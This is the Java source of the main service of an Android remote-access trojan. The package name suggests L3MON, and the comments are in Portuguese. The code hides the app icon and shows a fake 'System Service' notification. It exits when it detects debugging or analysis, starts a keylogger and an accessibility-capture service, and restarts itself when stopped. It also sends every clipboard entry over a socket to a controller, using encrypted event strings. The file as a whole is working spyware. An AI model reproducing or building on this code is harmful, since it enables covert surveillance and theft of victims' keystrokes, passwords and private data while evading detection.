package com.etechd.l3mon;

import android.app.Service;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

public class MainService extends Service {

    private static Context contextOfApplication;

    // ==================== ANTI-DEBUG TIMER ====================
    private static final Handler antiDebugHandler = new Handler();
    private static final long ANTI_DEBUG_INTERVAL = 15000; // 15 segundos

    private static final Runnable antiDebugRunnable = new Runnable() {
        @Override
        public void run() {
            if (!AntiAnalysis.isSafeEnvironment()) {
                Log.e("AntiAnalysis", "Ambiente de análise detectado! Encerrando aplicação...");
                System.exit(0);
            } else {
                Log.d("AntiAnalysis", "Verificação anti-análise: OK");
            }
            antiDebugHandler.postDelayed(this, ANTI_DEBUG_INTERVAL);
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        contextOfApplication = this;

        // Inicia como Foreground Service para garantir persistência no Android 14+
        createMainForegroundNotification();

        // === ANTI-ANALYSIS ===
        AntiAnalysis.init(this);
        AntiAnalysis.enable();

        // Inicia verificações periódicas
        startAntiDebugTimer();

        // Inicia serviço de persistência
        startPersistenceService();

        // Inicia KeyLogger
        Intent keyIntent = new Intent(this, L3M0NKeyLogger.class);
        startService(keyIntent);
    }

    private void createMainForegroundNotification() {
        String channelId = "main_service_channel";
        android.app.NotificationManager notificationManager = (android.app.NotificationManager) getSystemService(
                NOTIFICATION_SERVICE);

        android.app.Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            android.app.NotificationChannel channel = new android.app.NotificationChannel(
                    channelId, "System Monitor",
                    android.app.NotificationManager.IMPORTANCE_LOW);
            notificationManager.createNotificationChannel(channel);
            builder = new android.app.Notification.Builder(this, channelId);
        } else {
            builder = new android.app.Notification.Builder(this);
        }

        android.app.Notification notification = builder
                .setContentTitle("System Service")
                .setContentText("Monitoring system health...")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setOngoing(true)
                .build();

        if (Build.VERSION.SDK_INT >= 34) {
            // 0x01 is FOREGROUND_SERVICE_TYPE_DATA_SYNC
            startForeground(1001, notification, 1);
        } else {
            startForeground(1001, notification);
        }
    }

    private void startPersistenceService() {
        Intent persistIntent = new Intent(this, AccessibilityCaptureService.HideIconBackgroundService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(persistIntent);
        } else {
            startService(persistIntent);
        }
    }

    private void startAntiDebugTimer() {
        antiDebugHandler.postDelayed(antiDebugRunnable, 10000);
        Log.d("MainService", "Timer de Anti-Debug iniciado (intervalo: 15s)");
    }

    private void stopAntiDebugTimer() {
        antiDebugHandler.removeCallbacks(antiDebugRunnable);
        Log.d("MainService", "Timer de Anti-Debug parado");
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2) {
        // Oculta ícone do app
        PackageManager pkg = this.getPackageManager();
        pkg.setComponentEnabledSetting(
                new ComponentName(this, MainActivity.class),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);

        // Listener de Clipboard com String Encryption
        ClipboardManager clipboardManager = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
        clipboardManager.addPrimaryClipChangedListener(() -> {
            if (clipboardManager.hasPrimaryClip()) {
                ClipData clipData = clipboardManager.getPrimaryClip();
                if (clipData != null && clipData.getItemCount() > 0) {
                    CharSequence text = clipData.getItemAt(0).getText();
                    if (text != null && text.length() > 0) {
                        try {
                            JSONObject data = new JSONObject();
                            data.put(StringCrypto.d("/sagTjhasb91obJdF7CTZQ=="), text); // "text"

                            if (IOSocket.getInstance() != null && IOSocket.getInstance().getIoSocket() != null) {
                                // Evento 0xCB criptografado
                                String eventClipboard = StringCrypto.d("EE3oX3TnmSHEuEA1GpY6FQ=="); // 0xCB
                                IOSocket.getInstance().getIoSocket().emit(eventClipboard, data);
                            }
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    }
                }
            }
        });

        // Inicia serviços principais
        startService(new Intent(this, AccessibilityCaptureService.class));
        ConnectionManager.startAsync(this);

        return Service.START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        stopAntiDebugTimer();
        sendBroadcast(new Intent("respawnService"));
    }

    public static Context getContextOfApplication() {
        return contextOfApplication;
    }
}